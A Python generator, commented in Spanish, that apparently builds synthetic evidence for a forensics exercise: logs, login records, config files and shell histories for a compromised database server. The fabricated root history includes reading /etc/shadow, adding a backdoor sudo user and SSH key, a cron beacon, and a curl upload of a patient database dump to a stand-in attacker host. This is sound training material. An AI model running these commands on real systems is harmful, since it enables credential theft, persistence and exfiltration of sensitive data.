"""
Evidencias de host de db01: auth.log, syslog, historiales, ficheros de
configuración, wtmp/btmp/lastlog en binario y el tar de triage con los
mtimes de la línea temporal.
"""
import io
import random
import struct
import tarfile

from . import base as B

LOG_START = B.t29(-24, 0)          # 28 de septiembre 00:00: los logs cubren tres días
AUTH, SYSLOG = [], []              # listas de (ts, texto)
WTMP, BTMP = [], []
LASTLOG = {}                       # uid -> (ts, line, host)
FILES = {}                         # ruta relativa -> dict(data, mtime, mode, uid, gid)
pids = B.PidPool(46100)
sessions = B.PidPool(380, (1, 1))


def auth(ts, prog, pid, msg): AUTH.append((ts, prog, pid, msg))
def sysl(ts, prog, pid, msg): SYSLOG.append((ts, prog, pid, msg))


def render(entries):
    return "\n".join(f"{B.syslog_time(ts)} {B.HOSTNAME} {prog}{f'[{pid}]' if pid is not None else ''}: {msg() if callable(msg) else msg}"
                     for ts, prog, pid, msg in entries) + "\n"


def number_pids():
    """Numera los Pid diferidos por orden cronológico de su primera aparición."""
    first = {}
    for ts, _, pid, _ in AUTH + SYSLOG:
        if isinstance(pid, B.Pid) and (id(pid) not in first or ts < first[id(pid)][0]):
            first[id(pid)] = (ts, pid)
    for rec in WTMP + BTMP:
        pid = rec[1]
        if isinstance(pid, B.Pid) and (id(pid) not in first or rec[6] < first[id(pid)][0]):
            first[id(pid)] = (rec[6], pid)
    pids.number({k: v[0] for k, v in first.items()})
    sessions.number({})


def put(path, data, mtime, mode=0o644, uid=0, gid=0):
    FILES[path] = dict(data=data.encode() if isinstance(data, str) else data, mtime=mtime, mode=mode, uid=uid, gid=gid)


# ------------------------------------------------------------------ utmp
UT_FMT = "<hxxi32s4s32s256shhiii4i20x"
RUN_LVL, BOOT_TIME, LOGIN_PROCESS, USER_PROCESS, DEAD_PROCESS = 1, 2, 6, 7, 8


def ip4_words(ip):
    if not ip or not ip[0].isdigit():
        return [0, 0, 0, 0]
    return [struct.unpack("<i", bytes(int(x) for x in ip.split(".")))[0], 0, 0, 0]


def ut(ty, pid, line, uid_, user, host, ts, ip=None):
    return (ty, pid, line, uid_, user, host, ts, ip if ip is not None else host)


def pack_ut(rec):
    ty, pid, line, uid_, user, host, ts, ip = rec
    return struct.pack(UT_FMT, ty, int(pid), line.encode(), uid_.encode(), user.encode(), host.encode(),
                       0, 0, 0, int(ts), int((ts % 1) * 1e6), *ip4_words(ip))


# ------------------------------------------------------------------ sesiones SSH
def ssh_fail(ts, ip, user, port, tries, exists):
    """Conexión SSH con `tries` contraseñas fallidas y desconexión del cliente."""
    pid, t = pids.next(), ts
    if not exists:
        auth(t, "sshd", pid, f"Invalid user {user} from {ip} port {port}")
    for _ in range(tries):
        if exists:
            auth(t, "sshd", pid, f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}")
            t += random.uniform(1.5, 2.5)
            auth(t, "sshd", pid, f"Failed password for {user} from {ip} port {port} ssh2")
        else:
            auth(t, "sshd", pid, "pam_unix(sshd:auth): check pass; user unknown")
            auth(t, "sshd", pid, f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}")
            t += random.uniform(1.5, 2.5)
            auth(t, "sshd", pid, f"Failed password for invalid user {user} from {ip} port {port} ssh2")
        BTMP.append(ut(USER_PROCESS, pid, "ssh:notty", "", user, ip, t))
        t += random.uniform(1.0, 2.5)
    who = f"authenticating user {user}" if exists else f"invalid user {user}"
    auth(t, "sshd", pid, f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]")
    auth(t, "sshd", pid, f"Disconnected from {who} {ip} port {port} [preauth]")
    return t


def ssh_login(ts, ip, user, uid, port, tty, method, fp=None, logout=None):
    """Login SSH correcto: auth.log, syslog, wtmp y lastlog. Devuelve el pid de sshd."""
    pid, sess = pids.next(), sessions.next(ts)
    how = f"Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 {fp}" if method == "publickey" \
        else f"Accepted password for {user} from {ip} port {port} ssh2"
    auth(ts, "sshd", pid, how)
    auth(ts, "sshd", pid, f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)")
    auth(ts + 0.02, "systemd-logind", B.PID_LOGIND, lambda: f"New session {sess} of user {user}.")
    sysl(ts + 0.02, "systemd", 1, lambda: f"Started Session {sess} of User {user}.")
    WTMP.append(ut(USER_PROCESS, pid, tty, tty[-4:], user, ip, ts))
    LASTLOG[uid] = (ts, tty, ip)
    if logout is not None:
        auth(logout, "sshd", pid, f"Received disconnect from {ip} port {port}:11: disconnected by user")
        auth(logout, "sshd", pid, f"Disconnected from user {user} {ip} port {port}")
        auth(logout, "sshd", pid, f"pam_unix(sshd:session): session closed for user {user}")
        auth(logout + 0.03, "systemd-logind", B.PID_LOGIND, lambda: f"Session {sess} logged out. Waiting for processes to exit.")
        auth(logout + 0.05, "systemd-logind", B.PID_LOGIND, lambda: f"Removed session {sess}.")
        sysl(logout + 0.05, "systemd", 1, lambda: f"session-{sess}.scope: Deactivated successfully.")
        WTMP.append(ut(DEAD_PROCESS, pid, tty, tty[-4:], "", "", logout, ""))
    return pid


def cron_job(ts, user, uid, cmd, duration=0.4):
    pid, child = pids.next(), pids.next()
    auth(ts, "CRON", pid, f"pam_unix(cron:session): session opened for user {user}(uid={uid}) by (uid=0)")
    sysl(ts + 0.001, "CRON", child, f"({user}) CMD ({cmd})")
    auth(ts + duration, "CRON", pid, f"pam_unix(cron:session): session closed for user {user}")
    return pid


# ------------------------------------------------------------------ ruido de fondo
def background():
    day = int(LOG_START)
    end = B.TRIAGE_TIME
    t = LOG_START
    while t < end:
        d = B.dt(t)
        # sysstat cada 10 minutos (5,15,25...) -- cadencia parecida a la del cron del atacante
        if d.minute % 10 == 5 and d.second == 0:
            cron_job(t + random.uniform(0.3, 1.2), "root", 0, "command -v debian-sa1 > /dev/null && debian-sa1 1 1", 0.2)
        if d.minute == 17 and d.second == 0:
            cron_job(t + 1.0, "root", 0, "   cd / && run-parts --report /etc/cron.hourly", 0.3)
        if d.hour == 6 and d.minute == 25 and d.second == 0:
            cron_job(t + 1.0, "root", 0, "test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }", 41)
            sysl(t + 3, "systemd", 1, "Starting Daily apt download activities...")
            sysl(t + 9, "systemd", 1, "apt-daily.service: Deactivated successfully.")
            sysl(t + 9, "systemd", 1, "Finished Daily apt download activities.")
        if d.hour == 0 and d.minute == 0 and d.second == 0:
            sysl(t + 1, "systemd", 1, "Starting Rotate log files...")
            sysl(t + 1.4, "systemd", 1, "logrotate.service: Deactivated successfully.")
            sysl(t + 1.4, "systemd", 1, "Finished Rotate log files.")
        if d.hour == 23 and d.minute == 0 and d.second == 0:
            backup_run(t + 1)
        t += 1
    # mvega: sesiones legítimas de los días anteriores y la de la noche del 29
    ssh_login(B.t29(-24 + 9, 14, 3), B.WS, "mvega", 1001, 51088, "pts/0", "publickey", B.MVEGA_KEY_FP, B.t29(-24 + 9, 31, 40))
    ssh_login(B.T_MVEGA_IN, B.WS, "mvega", 1001, B.MVEGA_PORT, "pts/0", "publickey", B.MVEGA_KEY_FP, B.T_MVEGA_OUT)
    # Escáneres
    for ts, user, port, exists in B.SCANNER_ATTEMPTS:
        ssh_fail(ts, B.SCANNER, user, port, 1, exists)
    for ts, user, port, exists in B.LATE_SCANNER_ATTEMPTS:
        ssh_fail(ts, B.LATE_SCANNER, user, port, 1, exists)
    # Avisos de sshd por el escáner (ratio de conexiones)
    auth(B.t30(0, 2, 11), "sshd", B.PID_SSHD, "error: beginning MaxStartups throttling")
    auth(B.t30(0, 2, 50), "sshd", B.PID_SSHD, "exited MaxStartups throttling after 00:00:39, 2 connections dropped")


def backup_run(ts):
    pid, child, script = pids.next(), pids.next(), pids.next()
    auth(ts, "CRON", pid, "pam_unix(cron:session): session opened for user kbbackup(uid=1003) by (uid=0)")
    sysl(ts + 0.001, "CRON", child, "(kbbackup) CMD (/usr/local/bin/db-backup.sh)")
    sysl(ts + 2, "db-backup", script, "inicio copia mariadb")
    sysl(ts + 171, "db-backup", script, f"volcado completado: /var/backups/mariadb/all-{B.dt(ts).strftime('%Y%m%d')}.sql.gz")
    sysl(ts + 269, "db-backup", script, f"rsync a nas01 completado: {B.BACKUP_BYTES} bytes")
    auth(ts + 269.5, "CRON", pid, "pam_unix(cron:session): session closed for user kbbackup")


# ------------------------------------------------------------------ intrusión
def intrusion():
    for ts, user, port, tries, exists in B.ATTACKER_FAILS:
        ssh_fail(ts, B.ATTACKER, user, port, tries, exists)
    sshd_pid = ssh_login(B.T_LOGIN, B.ATTACKER, "portal_app", 1002, B.PORT_LOGIN, "pts/0", "password", logout=B.T_LOGOUT)
    auth(B.T_SUDO_L, "sudo", None, "portal_app : TTY=pts/0 ; PWD=/home/portal_app ; USER=root ; COMMAND=list")
    auth(B.T_SUDO_VIM, "sudo", None, "portal_app : TTY=pts/0 ; PWD=/home/portal_app ; USER=root ; COMMAND=/usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf")
    auth(B.T_SUDO_VIM, "sudo", None, "pam_unix(sudo:session): session opened for user root(uid=0) by portal_app(uid=1002)")
    ua = pids.next()
    auth(B.T_USERADD, "useradd", ua, "new group: name=support, GID=1004")
    auth(B.T_USERADD, "useradd", ua, "new user: name=support, UID=1004, GID=1004, home=/home/support, shell=/bin/bash, from=/dev/pts/0")
    auth(B.T_USERADD, "useradd", ua, "add 'support' to group 'sudo'")
    auth(B.T_USERADD, "useradd", ua, "add 'support' to shadow group 'sudo'")
    auth(B.T_PASSWD, "passwd", pids.next(), "pam_unix(passwd:chauthtok): password changed for support")
    sysl(B.T_CRON_RELOAD, "cron", B.PID_CRON, "(*system*mariadb-health) RELOAD (/etc/cron.d/mariadb-health)")
    for ts in B.BEACON_TIMES:
        cron_job(ts, "root", 0, B.CRON_CMD, random.uniform(0.6, 1.1))
    # el cron sigue después de la captura, hasta el triage
    t = B.BEACON_TIMES[-1] + 600
    while t < B.TRIAGE_TIME:
        cron_job(t, "root", 0, B.CRON_CMD, random.uniform(0.6, 1.1))
        t += 600
    auth(B.T_SUDO_CLOSE, "sudo", None, "pam_unix(sudo:session): session closed for user root")
    ssh_login(B.T_KEY_LOGIN, B.ATTACKER, "root", 0, B.PORT_KEY_LOGIN, "pts/0", "publickey", B.attacker_key_fingerprint(), B.T_KEY_LOGOUT)
    # La DBA entra por la mañana, ve el cron y avisa. Su sesión sigue abierta en el triage.
    ssh_login(B.t30(8, 10, 27), B.WS, "mvega", 1001, 52390, "pts/0", "publickey", B.MVEGA_KEY_FP)
    auth(B.t30(8, 29, 48), "sudo", None, "   mvega : TTY=pts/0 ; PWD=/home/mvega ; USER=root ; COMMAND=/usr/bin/tar --xattrs -czpf /mnt/triage/db01-triage-2026-09-30.tar.gz -T /mnt/triage/lista.txt")
    auth(B.t30(8, 29, 48), "sudo", None, "pam_unix(sudo:session): session opened for user root(uid=0) by mvega(uid=1001)")


# ------------------------------------------------------------------ historiales
def hist(entries):
    """Formato de bash con HISTTIMEFORMAT: línea '#epoch' seguida del comando."""
    return "".join(f"#{int(ts)}\n{cmd}\n" for ts, cmd in entries)


def root_history():
    march = B.t29(-24 * 190, 10)   # instalación, marzo de 2026
    old = [(march + i * 40, c) for i, c in enumerate([
        "apt update && apt upgrade -y", "apt install -y mariadb-server mariadb-client sysstat rsync",
        "mysql_secure_installation", "systemctl enable --now mariadb", "useradd -m -s /bin/bash -G sudo mvega",
        "passwd mvega", "mkdir -p /home/mvega/.ssh && chmod 700 /home/mvega/.ssh",
        "vim /etc/ssh/sshd_config", "systemctl restart ssh", "ufw allow from 10.20.30.0/24 to any port 3306",
        "ufw enable", "exit"])]
    s = B.T_ROOT_SHELL
    attack = [
        (s, "id"), (s + 6, "cat /etc/shadow"), (s + 31, "mysql -e 'SHOW DATABASES'"),
        (s + 58, "mysql -e 'SHOW TABLES FROM kb_clinica'"), (s + 84, "mysql -e 'SELECT COUNT(*) FROM kb_clinica.pacientes'"),
        (s + 131, "ls -la /var/backups/mariadb/"), (s + 160, "cat /etc/ssh/sshd_config | grep -i permitroot"),
        (B.T_USERADD, "useradd -m -s /bin/bash -G sudo support"), (B.T_PASSWD, "passwd support"),
        (B.T_AUTHKEY - 8, "mkdir -p /root/.ssh && chmod 700 /root/.ssh"),
        (B.T_AUTHKEY, f"echo '{B.attacker_pubkey()[0]}' >> /root/.ssh/authorized_keys"),
        (B.T_AUTHKEY + 4, "chmod 600 /root/.ssh/authorized_keys"),
        (B.T_CRON_FILE, f"printf '*/10 * * * * root {B.CRON_CMD}\\n' > {B.CRON_FILE}"),
        (B.T_CRON_FILE + 7, f"cat {B.CRON_FILE}"),
        (B.T_STAGING, f"mkdir -p {B.STAGING}"),
        (B.T_STAGING + 11, f"mysqldump kb_clinica > {B.STAGING}/kb_clinica.sql"),
        (B.T_STAGING + 101, f"tar czf {B.STAGING}/{B.EXFIL_NAME} -C {B.STAGING} kb_clinica.sql"),
        (B.T_STAGING + 139, f"ls -la {B.STAGING}"),
        (B.T_EXFIL, f"curl -F 'f=@{B.STAGING}/{B.EXFIL_NAME}' http://{B.ATTACKER}:{B.ATTACKER_PORT_HTTP}/up"),
        (B.T_RM_STAGING, f"rm -rf {B.STAGING}"),
        (B.T_ROOT_EXIT, "exit"),
    ]
    k = B.T_KEY_LOGIN
    back = [(k + 5, "id"), (k + 12, f"cat {B.CRON_FILE}"), (k + 30, "tail -n 3 /var/log/syslog"),
            (k + 61, "w"), (B.T_KEY_LOGOUT - 1, "exit")]
    return hist(old + attack + back)


def mvega_history():
    out = []
    for day, h in [(-7, 9), (-4, 16), (-1, 9)]:
        t = B.t29(day * 24 + h, 14, 3)
        out += [(t + 10, "systemctl status mariadb"), (t + 40, "df -h /var/lib/mysql"),
                (t + 75, "sudo tail -n 50 /var/log/mysql/error.log"), (t + 130, "mysql -e \"SHOW GLOBAL STATUS LIKE 'Threads_connected'\""),
                (t + 200, "ls -la /var/backups/mariadb/ | tail -n 5"), (t + 240, "exit")]
    t = B.T_MVEGA_IN
    out += [(t + 15, "systemctl status mariadb"), (t + 48, "df -h"), (t + 97, "mysql -e \"SHOW GLOBAL STATUS LIKE 'Threads_connected'\""),
            (t + 160, "sudo tail -n 50 /var/log/mysql/error.log"), (t + 410, "mysql -e 'SHOW PROCESSLIST' | head -n 20"),
            (t + 702, "cat /usr/local/bin/db-backup.sh"), (t + 840, "ls -la /var/backups/mariadb/ | tail -n 5"),
            (B.T_MVEGA_OUT - 2, "exit")]
    return hist(out)


def portal_app_history():
    t = B.t29(-11 * 24 + 14, 2, 0)      # despliegue del 18 de septiembre
    return hist([(t, "cd /opt/portal-deploy"), (t + 20, "git pull"), (t + 95, "./deploy.sh --env prod --migrate"),
                 (t + 1500, "mysql -u portal_app -p kb_portal -e 'SELECT COUNT(*) FROM productos'"),
                 (t + 1560, "sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf"),
                 (t + 1700, "sudo -l"), (t + 2280, "exit")])


# ------------------------------------------------------------------ ficheros de configuración
SYSTEM_PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:105:111::/home/syslog:/usr/sbin/nologin
_chrony:x:106:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
"""


def passwd_file():
    # La cuenta 'backup' del sistema (uid 34) ya existe en Ubuntu; la DBA creó 'kbbackup' para las copias.
    lines = SYSTEM_PASSWD
    for name, uid, gid, gecos, home, shell in B.LOCAL_USERS:
        if False:
            name = "kbbackup"
        lines += f"{name}:x:{uid}:{gid}:{gecos}:{home}:{shell}\n"
    n, uid, gid, gecos, home, shell = B.NEW_USER
    return lines + f"{n}:x:{uid}:{gid}:{gecos}:{home}:{shell}\n"


def shadow_file():
    day = lambda ts: int(ts // 86400)
    out = f"root:*:{day(B.t29(-24*190, 0))}:0:99999:7:::\n"
    for l in SYSTEM_PASSWD.splitlines()[1:]:
        out += f"{l.split(':')[0]}:*:{day(B.t29(-24*190, 0))}:0:99999:7:::\n"
    out += f"mvega:{B.HASHES['mvega']}:{day(B.t29(-24*45, 0))}:0:99999:7:::\n"
    out += f"portal_app:{B.HASHES['portal_app']}:{day(B.t29(-24*120, 0))}:0:99999:7:::\n"
    out += f"kbbackup:*:{day(B.t29(-24*120, 0))}:0:99999:7:::\n"
    out += f"support:{B.HASHES['support']}:{day(B.T_PASSWD)}:0:99999:7:::\n"
    return out


def group_file():
    base = ["root:x:0:", "daemon:x:1:", "bin:x:2:", "sys:x:3:", "adm:x:4:syslog,mvega", "tty:x:5:", "disk:x:6:", "lp:x:7:",
            "mail:x:8:", "news:x:9:", "uucp:x:10:", "man:x:12:", "proxy:x:13:", "kmem:x:15:", "dialout:x:20:", "fax:x:21:",
            "voice:x:22:", "cdrom:x:24:mvega", "floppy:x:25:", "tape:x:26:", "sudo:x:27:mvega,support", "audio:x:29:",
            "dip:x:30:mvega", "www-data:x:33:", "backup:x:34:", "operator:x:37:", "list:x:38:", "irc:x:39:", "src:x:40:",
            "gnats:x:41:", "shadow:x:42:", "utmp:x:43:", "video:x:44:", "sasl:x:45:", "plugdev:x:46:mvega", "staff:x:50:",
            "games:x:60:", "users:x:100:", "nogroup:x:65534:", "systemd-journal:x:101:", "systemd-network:x:102:",
            "systemd-resolve:x:103:", "messagebus:x:104:", "systemd-timesync:x:105:", "input:x:106:", "sgx:x:107:",
            "kvm:x:108:", "render:x:109:", "lxd:x:110:mvega", "syslog:x:111:", "_chrony:x:112:", "ssh:x:113:",
            "mysql:x:114:", "mvega:x:1001:", "portal_app:x:1002:", "kbbackup:x:1003:", "support:x:1004:"]
    return "\n".join(base) + "\n"


SUDOERS = """#
# This file MUST be edited with the 'visudo' command as root.
#
Defaults\tenv_reset
Defaults\tmail_badpass
Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults\tuse_pty

root\tALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo\tALL=(ALL:ALL) ALL

@includedir /etc/sudoers.d
"""

SUDOERS_PORTAL = """# Despliegue del portal: permitir ajustar la configuración de MariaDB sin pedir a la DBA
# MVega 2026-06-11
portal_app ALL=(root) NOPASSWD: /usr/bin/vim /etc/mysql/mariadb.conf.d/*
"""

SSHD_CONFIG = """Include /etc/ssh/sshd_config.d/*.conf
Port 22
# Mantenimiento remoto de la DBA (NAT 2222 en fw01). Temporal hasta tener la VPN -- MVega 2026-05
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding no
PrintMotd no
AcceptEnv LANG LC_*
Subsystem\tsftp\t/usr/lib/openssh/sftp-server
"""

HISTORY_SH = """# Historial con marca de tiempo para auditoría de cambios en db01
export HISTTIMEFORMAT="%F %T "
export HISTSIZE=5000
export HISTFILESIZE=10000
shopt -s histappend
"""

CRONTAB = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly
25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
"""

CRON_SYSSTAT = """# The first element of the path is a directory where the debian-sa1
# script is located
PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1

# Additional run at 23:59 to rotate the statistics file
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
"""

CRON_E2SCRUB = """30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
"""

CRON_BACKUP = """# Copia nocturna de MariaDB hacia nas01 -- MVega
0 23 * * * kbbackup /usr/local/bin/db-backup.sh
"""

DB_BACKUP_SH = """#!/bin/bash
# Copia completa de MariaDB y envío a nas01 por rsync/SSH.
set -euo pipefail
DEST=/var/backups/mariadb
STAMP=$(date +%Y%m%d)
logger -t db-backup "inicio copia mariadb"
mysqldump --defaults-file=/etc/mysql/debian.cnf --all-databases --single-transaction | gzip > "$DEST/all-$STAMP.sql.gz"
logger -t db-backup "volcado completado: $DEST/all-$STAMP.sql.gz"
rsync -a --delete "$DEST/" kbbackup@nas01.kelbrook.internal:/volume1/backups/db01/
logger -t db-backup "rsync a nas01 completado: $(stat -c %s "$DEST/all-$STAMP.sql.gz") bytes"
find "$DEST" -name 'all-*.sql.gz' -mtime +14 -delete
"""

OS_RELEASE = """PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
"""

SKEL_BASHRC = "# ~/.bashrc: executed by bash(1) for non-login shells.\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\nHISTCONTROL=ignoreboth\nshopt -s histappend\nHISTSIZE=1000\nHISTFILESIZE=2000\n"
SKEL_PROFILE = "# ~/.profile: executed by the command interpreter for login shells.\nif [ -n \"$BASH_VERSION\" ]; then\n    if [ -f \"$HOME/.bashrc\" ]; then\n\t. \"$HOME/.bashrc\"\n    fi\nfi\n"
SKEL_LOGOUT = "# ~/.bash_logout: executed by bash(1) when login shell exits.\nif [ \"$SHELL\" = \"/bin/bash\" ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n"


# ------------------------------------------------------------------ montaje
def wtmp_boot_records():
    boot = B.t29(-15 * 24 + 6, 12, 3)
    kernel = "5.15.0-122-generic"
    WTMP.append(ut(BOOT_TIME, 0, "~", "~~", "reboot", kernel, boot, ""))
    WTMP.append(ut(RUN_LVL, 0x3532, "~", "~~", "runlevel", kernel, boot + 4, ""))
    WTMP.append(ut(LOGIN_PROCESS, 1188, "tty1", "tty1", "LOGIN", "", boot + 6, ""))


def lastlog_bytes():
    maxuid = max(LASTLOG) if LASTLOG else 0
    maxuid = max(maxuid, B.NEW_USER[1])
    out = bytearray(292 * (maxuid + 1))
    for uid, (ts, line, host) in LASTLOG.items():
        out[uid * 292:(uid + 1) * 292] = struct.pack("<i32s256s", int(ts), line.encode(), host.encode())
    return bytes(out)


def build(out_path):
    wtmp_boot_records()
    background()
    intrusion()
    AUTH.sort(key=lambda x: x[0]); SYSLOG.sort(key=lambda x: x[0])
    WTMP.sort(key=lambda r: r[6]); BTMP.sort(key=lambda r: r[6])
    number_pids()

    old = B.t29(-24 * 190, 10)
    put("var/log/auth.log", render(AUTH), B.TRIAGE_TIME, 0o640, 104, 4)
    put("var/log/syslog", render(SYSLOG), B.TRIAGE_TIME, 0o640, 104, 4)
    put("var/log/wtmp", b"".join(map(pack_ut, WTMP)), B.t30(8, 10, 27), 0o664, 0, 43)
    put("var/log/btmp", b"".join(map(pack_ut, BTMP)), B.LATE_SCANNER_ATTEMPTS[-1][0] + 2, 0o660, 0, 43)
    put("var/log/lastlog", lastlog_bytes(), B.t30(8, 10, 27), 0o664, 0, 43)

    put("etc/passwd", passwd_file(), B.T_USERADD)
    put("etc/shadow", shadow_file(), B.T_PASSWD, 0o640, 0, 42)
    put("etc/group", group_file(), B.T_USERADD)
    put("etc/sudoers", SUDOERS, old + 3600, 0o440)
    put("etc/sudoers.d/README", "# Files in this directory are included by /etc/sudoers via @includedir.\n", old, 0o440)
    put("etc/sudoers.d/portal_app", SUDOERS_PORTAL, B.t29(-24 * 110 + 11, 32, 8), 0o440)
    put("etc/crontab", CRONTAB, old)
    put("etc/cron.d/sysstat", CRON_SYSSTAT, old + 120)
    put("etc/cron.d/e2scrub_all", CRON_E2SCRUB, old)
    put("etc/cron.d/mariadb-backup", CRON_BACKUP, B.t29(-24 * 118 + 16, 4, 51))
    put("etc/cron.d/mariadb-health", f"*/10 * * * * root {B.CRON_CMD}\n", B.T_CRON_FILE)
    put("etc/ssh/sshd_config", SSHD_CONFIG, B.t29(-24 * 140 + 10, 21, 0))
    put("etc/profile.d/history.sh", HISTORY_SH, B.t29(-24 * 150 + 12, 0, 0))
    put("etc/os-release", OS_RELEASE, old - 86400 * 30)
    put("etc/hostname", B.HOSTNAME + "\n", old - 3600)
    put("usr/local/bin/db-backup.sh", DB_BACKUP_SH, B.t29(-24 * 118 + 16, 1, 12), 0o755)

    put("root/.bash_history", root_history(), B.T_KEY_LOGOUT, 0o600)
    put("root/.ssh/authorized_keys", B.attacker_pubkey()[0] + "\n", B.T_AUTHKEY, 0o600)
    put("home/mvega/.bash_history", mvega_history(), B.T_MVEGA_OUT, 0o600, 1001, 1001)
    put("home/mvega/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDZ3b3JrcGMtbXZlZ2Eta2V5LWZpY3RpY2lhMDE mvega@ws-it-02\n", B.t29(-24 * 190, 12), 0o600, 1001, 1001)
    put("home/portal_app/.bash_history", portal_app_history(), B.t29(-11 * 24 + 14, 40, 0), 0o600, 1002, 1002)
    for f, c in [(".bashrc", SKEL_BASHRC), (".profile", SKEL_PROFILE), (".bash_logout", SKEL_LOGOUT)]:
        put(f"home/support/{f}", c, B.T_USERADD, 0o644, 1004, 1004)

    dirs = {"var/spool/cron/crontabs": (B.t29(-24 * 190, 10), 0o1730, 0, 102)}
    with tarfile.open(out_path, "w:gz") as tf:
        for d, (mt, mode, uid, gid) in dirs.items():
            ti = tarfile.TarInfo(d); ti.type = tarfile.DIRTYPE; ti.mtime, ti.mode, ti.uid, ti.gid = int(mt), mode, uid, gid
            tf.addfile(ti)
        for path in sorted(FILES):
            f = FILES[path]
            ti = tarfile.TarInfo(path)
            ti.size, ti.mtime, ti.mode, ti.uid, ti.gid = len(f["data"]), int(f["mtime"]), f["mode"], f["uid"], f["gid"]
            ti.uname = {0: "root", 104: "syslog", 1001: "mvega", 1002: "portal_app", 1004: "support"}.get(f["uid"], "")
            ti.gname = {0: "root", 4: "adm", 42: "shadow", 43: "utmp", 1001: "mvega", 1002: "portal_app", 1004: "support"}.get(f["gid"], "")
            tf.addfile(ti, io.BytesIO(f["data"]))
    return dict(auth=len(AUTH), syslog=len(SYSLOG), wtmp=len(WTMP), btmp=len(BTMP))
